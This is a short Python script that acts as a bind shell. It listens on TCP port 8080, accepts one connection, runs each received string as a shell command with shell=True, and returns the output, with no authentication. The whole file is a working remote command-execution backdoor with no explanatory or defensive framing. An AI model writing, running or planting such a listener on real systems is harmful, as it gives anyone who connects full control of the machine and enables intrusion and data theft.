#!/usr/bin/python

import socket
import subprocess as sp


def main():
    port = 8080

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('', port))
    server_socket.listen()
    client_socket, address = server_socket.accept()

    while True:
        command = client_socket.recv(2048)

        if command.decode('ascii') == 'exit':
            break

        with sp.Popen([command], shell=True, universal_newlines=True, stdout=sp.PIPE, stderr=sp.PIPE) as process:

            process_stdout, process_stderr = process.communicate()

            if process.returncode is 0:
                client_socket.send(process_stdout.encode('ascii'))
                pass
            else:
                client_socket.send(process_stderr.encode('ascii'))
                pass


    print('Bye!')
    client_socket.close()


if __name__ == '__main__':
    main()
